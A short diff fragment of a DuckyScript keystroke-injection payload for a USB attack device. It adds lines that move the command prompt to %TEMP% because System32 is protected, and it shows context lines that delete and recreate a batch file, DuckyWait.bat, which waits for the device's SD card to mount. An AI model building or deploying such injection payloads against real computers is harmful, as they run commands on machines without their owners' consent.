@@ -20,6 +20,10 @@ DOWNARROW
 REPEAT 100
 ENTER
 
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+
 REM Make batch file that waits for SD card to mount. 
 REM Delete batch file if already exists
 STRING erase /Q DuckyWait.bat
